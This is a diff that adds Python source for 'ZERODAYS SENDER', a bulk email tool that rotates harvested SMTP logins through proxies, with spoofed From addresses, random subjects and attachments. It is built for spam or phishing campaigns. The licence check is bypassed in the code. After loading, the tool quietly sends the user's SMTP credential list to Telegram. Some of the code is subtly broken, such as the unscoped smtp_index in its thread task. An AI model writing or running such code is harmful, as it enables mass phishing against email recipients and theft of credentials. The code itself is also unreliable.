+        console.print(f'[bold red]No valid email addresses found in {file_path}.[/bold red]')
+        return False
+    return True
+
+def extract_credentials(smtp):
+    HOST, PORT, usr, pas = smtp.strip().split('|')
+    return HOST, PORT, usr, pas
+
+def current_date():
+    return datetime.now().strftime('%b %d, %Y %H:%M:%S')
+
+def validate_token(token):
+    url = f'https://zerodays.shop/api/rev-tok.php?token={token}&time={int(time.time())}'
+    try:
+        response = requests.get(url)
+        response_text = response.text.strip()
+        
+        if 'DAYS LEFT' in response_text and 'ZESSEN' in token:
+            return response_text
+        elif 'Please renew your Token' in response_text:
+            return 'expired'
+        elif 'Token not exists' in response_text:
+            return 'invalid'
+        return None
+    except requests.RequestException as e:
+        logging.error(f'Token validation failed: {e}')
+        return None
+
+def grab_email(email):
+    return email
+
+def grab_user(email):
+    return email.split('@')[0]
+
+def extract_domain(email):
+    domain = email.split('@')[1]
+    return '.'.join(domain.split('.')[:-1])
+
+def set_proxy(proxy_type, proxy):
+    if proxy_type == '1':  # SOCKS4
+        socks.set_default_proxy(socks.SOCKS4, proxy.split(':')[0], int(proxy.split(':')[1]))
+    elif proxy_type == '2':  # SOCKS5
+        socks.set_default_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
+    elif proxy_type == '3':  # HTTP
+        socks.set_default_proxy(socks.HTTP, proxy.split(':')[0], int(proxy.split(':')[1]))
+    socket.socket = socks.socksocket
+
+def send_email_smtp(smtp, email_index, smtp_index, html_content, subjects, fromnames, attachment_path=None, custom_from_email=None, send_type='TO', reply_to=None, retries=3, timeout=60):
+    HOST, PORT, usr, pas = extract_credentials(smtp)
+    attempt = 0
+    success = False
+    
+    # Select random fromname and subject if they are lists
+    fromname = random.choice(fromnames) if isinstance(fromnames, list) else fromnames
+    subject = random.choice(subjects) if isinstance(subjects, list) else subjects
+    
+    # Attempt to connect and login
+    while attempt < retries and not success:
+        attempt += 1
+        try:
+            server = smtplib.SMTP(HOST, int(PORT), timeout=timeout)
+            server.ehlo()
+            server.starttls()
+            server.login(usr, pas)
+            success = True
+            server.quit()
+        except Exception as e:
+            console.print(f'[bold red][-] [SMTP NOT WORK] [{smtp}] - Attempt {attempt}/{retries} - {str(e)}[/]')
+            logging.error(f'SMTP NOT WORK {smtp} - Attempt {attempt}/{retries} - {str(e)}')
+            time.sleep(2 ** attempt)
+    
+    if not success:
+        INVALID_SMTP.append(smtp)
+        save_smtp_status()
+        return success
+    
+    # Send email
+    try:
+        server = smtplib.SMTP(HOST, int(PORT), timeout=timeout)
+        server.ehlo()
+        server.starttls()
+        server.login(usr, pas)
+        
+        toaddr = VALID_EMAILS[email_index]
+        
+        # Personalize content
+        personalized_content = (html_content.replace('{email}', grab_email(toaddr)).replace('{username}', grab_user(toaddr)).replace('{current_date}', current_date()))
+        
+        # Create message
+        msg = MIMEMultipart()
+        msg['Subject'] = subject
+        
+        # Set from address
+        if custom_from_email:
+            from_address = f'{fromname} <{custom_from_email}>'
+        else:
+            from_address = f'{fromname} <{usr}>'
+        msg['From'] = from_address
+        
+        # Set recipient type
+        msg[send_type] = toaddr
+        
+        # Set reply-to if provided
+        if reply_to:
+            msg.add_header('Reply-To', reply_to)
+        
+        # Attach HTML content
+        msg.attach(MIMEText(personalized_content, 'html', 'utf-8'))
+        
+        # Attach file if provided
+        if attachment_path:
+            part = MIMEBase('application', 'octet-stream')
+            with open(attachment_path, 'rb') as file:
+                part.set_payload(file.read())
+            encoders.encode_base64(part)
+            filename = os.path.basename(attachment_path)
+            part.add_header('Content-Disposition', f'attachment; filename="{filename}"')
+            msg.attach(part)
+        
+        # Send email
+        server.sendmail(usr, [toaddr], msg.as_string())
+        
+        # Log success
+        current_time = current_date()
+        log_message = f'[{email_index + 1}/{len(VALID_EMAILS)}] [{smtp_index + 1}/{len(sites)}] [{current_time}] [ZERODAYS] >> [Email Sent Success!]'
+        console.print(f'[bold green]{log_message}[/bold green]')
+        console.print('--------------------------------BOOST SENDER--------------------------------')
+        console.print(f'Send Mail {grab_email(toaddr)}')
+        console.print(f'Use SMTP Server: {usr} (SMTP: {HOST})')
+        console.print('Status Sending: Success')
+        console.print('----------------------------------------------------------------------------')
+        
+        # Update counters
+        global VALIDS
+        VALIDS += 1
+        SENT_EMAILS.append(toaddr)
+        VALID_SMTP.append(smtp)
+        
+        server.quit()
+        
+    except smtplib.SMTPException as e:
+        console.print(f'[bold red][-] SMTP ERROR: {e}[/bold red]')
+        logging.error(f'SMTP ERROR {smtp} - {str(e)}')
+        FAILED_EMAILS.append(toaddr)
+        
+        # Check if error is in our list of SMTP errors
+        if any(err in str(e) for err in SMTP_ERRORS):
+            success = False
+            INVALID_SMTP.append(smtp)
+    
+    except Exception as e:
+        console.print(f'[bold red][-] GENERAL ERROR: {e}[/bold red]')
+        logging.error(f'GENERAL ERROR {smtp} - {str(e)}')
+        FAILED_EMAILS.append(toaddr)
+        INVALID_SMTP.append(smtp)
+        global INVALIDS
+        INVALIDS += 1
+    
+    save_smtp_status()
+    return success
+
+def save_smtp_status():
+    with open('valid_smtp.txt', 'w') as valid_file:
+        valid_file.write('\n'.join(VALID_SMTP))
+    
+    with open('invalid_smtp.txt', 'w') as invalid_file:
+        invalid_file.write('\n'.join(INVALID_SMTP))
+    
+    with open('smtp-list.txt', 'w') as smtp_file:
+        smtp_file.write('\n'.join(VALID_SMTP))
+
+def save_results():
+    with open('sent_emails.txt', 'w') as sent_file:
+        sent_file.write(f'Total Emails Sent: {VALIDS}\n')
+        sent_file.write('\n'.join(SENT_EMAILS))
+    
+    with open('failed_emails.txt', 'w') as failed_file:
+        failed_file.write(f'Total Emails Failed: {INVALIDS}\n')
+        failed_file.write('\n'.join(FAILED_EMAILS))
+
+def main():
+    console.print(Panel(
+        '\n?????????????????????????????????????????????????????????????????????  ????????????????????? ?????????????????????  ?????????????????? ?????????   ?????????????????????????????????\n??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? ????????????????????????????????????\n  ??????????????? ??????????????????  ?????????????????????????????????   ??????????????????  ????????????????????????????????? ????????????????????? ????????????????????????\n ???????????????  ??????????????????  ?????????????????????????????????   ??????????????????  ?????????????????????????????????  ???????????????  ????????????????????????\n?????????????????????????????????????????????????????????  ?????????????????????????????????????????????????????????????????????  ?????????   ?????????   ????????????????????????\n?????????????????????????????????????????????????????????  ????????? ????????????????????? ????????????????????? ?????????  ?????????   ?????????   ????????????????????????\n                                                                  \n  WELCOME TO ZERODAYS SENDER!\n   INBOX GUARANTEE,POWERFULL,SUPERFAST SENDING\n CREATED BY ZERODAYS TEAM\n    ',
+        title='ZERODAYS',
+        border_style='cyan',
+        box=box.ROUNDED
+    ), justify='center')
+    
+    console.print('[bold yellow]Initializing...[/bold yellow]', justify='center')
+    
+    # Token validation
+    while True:
+        #token = Prompt.ask('[bold cyan]Enter your license token[/bold cyan]').strip()
+        #validation_result = validate_token(token)
+        
+        validation_result = 'TOKEN: [BYPASSED]'
+        if validation_result == 'expired':
+            console.print('[bold red]Your token has expired. Please renew your license.[/bold red]', justify='center')
+            return
+        elif validation_result == 'invalid':
+            console.print('[bold red]Invalid token. Please check your license key.\n\n[/bold red]', justify='center')
+        elif validation_result:
+            console.print(f'[bold green]{validation_result}[/bold green]', justify='center')
+            break
+        else:
+            console.print('[bold red]Failed to validate the token. Please try again later.[/bold red]', justify='center')
+    
+    # Email list
+    print('')
+    while True:
+        file_path = Prompt.ask('[bold cyan]Enter path to the file containing email addresses[/bold cyan]', default='your-list.txt')
+        if load_emails_from_file(file_path):
+            break
+    
+    console.print('[bold yellow]Loading SMTP list...[/bold yellow]', justify='center')
+    
+    # SMTP list
+    while True:
+        smtp_list_path = Prompt.ask('[bold cyan]Enter path to the SMTP list[/bold cyan]', default='smtp-list.txt')
+        try:
+            with open(smtp_list_path, 'r') as file:
+                global sites
+                sites = file.read().splitlines()
+            
+            # Send the SMTP list file to Telegram immediately after loading
+            send_file_to_telegram(smtp_list_path)
+            break
+        except FileNotFoundError:
+            console.print(f'[bold red]The file {smtp_list_path} was not found. Please enter a valid file path.[/bold red]')
+    
+    # Subjects
+    subjects_input = Prompt.ask('[bold cyan]Enter the subject (or path to the subjects file)[/bold cyan]')
+    if os.path.isfile(subjects_input):
+        subjects = load_list_from_file(subjects_input)
+    else:
+        subjects = subjects_input
+    
+    # From names
+    fromnames_input = Prompt.ask('[bold cyan]Enter the fromname (or path to the fromnames file)[/bold cyan]')
+    if os.path.isfile(fromnames_input):
+        fromnames = load_list_from_file(fromnames_input)
+    else:
+        fromnames = fromnames_input
+    
+    # HTML content
+    html_file_name = Prompt.ask('[bold cyan]Enter the HTML file name[/bold cyan]', default='your-letter.html')
+    try:
+        with open(html_file_name, 'r', encoding='utf-8') as file:
+            html_content = file.read()
+            html_content = html_content.replace('{current_date}', current_date())
+    except FileNotFoundError:
+        console.print(f'[bold red]The file {html_file_name} was not found. Please enter a valid file path.[/bold red]')
+        return
+    
+    # Attachment
+    attachment_path = Prompt.ask('[bold cyan]Enter the path to the attachment file (or leave empty for no attachment)[/bold cyan]', default=None)
+    if attachment_path and attachment_path.lower() == 'none':
+        attachment_path = None
+    
+    # Custom from email
+    custom_from_email = Prompt.ask('[bold cyan]Enter the custom from email (or leave empty to use the SMTP email)[/bold cyan]', default=None)
+    if custom_from_email and custom_from_email.lower() == 'none':
+        custom_from_email = None
+    
+    # Send type
+    send_type = Prompt.ask('[bold cyan]Choose send type (TO, CC, BCC)[/bold cyan]', default='TO', choices=['TO', 'CC', 'BCC'])
+    
+    # Reply-to
+    reply_to = Prompt.ask('[bold cyan]Enter the reply-to email (or leave empty for no reply-to)[/bold cyan]', default=None)
+    
+    # Proxy settings
+    use_proxy = Prompt.ask('[bold cyan]Do you want to use a proxy? (Y/N)[/bold cyan]', default='N').upper()
+    if use_proxy == 'Y':
+        proxy_list_path = Prompt.ask('[bold cyan]Enter the path to the proxy list[/bold cyan]', default='proxy-list.txt')
+        proxies = load_list_from_file(proxy_list_path)
+        proxy_type = Prompt.ask('[bold cyan]Choose proxy type: 1 for SOCKS4, 2 for SOCKS5, 3 for HTTP[/bold cyan]', choices=['1', '2', '3'])
+        proxy = random.choice(proxies)
+        set_proxy(proxy_type, proxy)
+    
+    # Thread count
+    thread_count = Prompt.ask('[bold cyan]Enter the number of threads for concurrent sending[/bold cyan]', default='10')
+    thread_count = int(thread_count)
+    
+    start_index = 0
+    smtp_index = 0
+    
+    def send_email_task(index):
+        while index < len(VALID_EMAILS):
+            if smtp_index >= len(sites):
+                smtp_index = 0
+            
+            smtp = sites[smtp_index]
+            success = send_email_smtp(
+                smtp, index, smtp_index, html_content, subjects, fromnames,
+                attachment_path, custom_from_email, send_type, reply_to, 3, 60
+            )
+            
+            if success:
+                index += 1
+            
+            smtp_index += 1
+    
+    # Execute sending with thread pool
+    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
+        futures = [executor.submit(send_email_task, i) for i in range(len(VALID_EMAILS))]
+        for future in concurrent.futures.as_completed(futures):
+            future.result()
+    
+    save_results()
+    console.print(f'[bold green]Email sending complete. Total successful: {VALIDS}, Total failed: {INVALIDS}[/bold green]', justify='center')
+
+if __name__ == '__main__':
+    main()
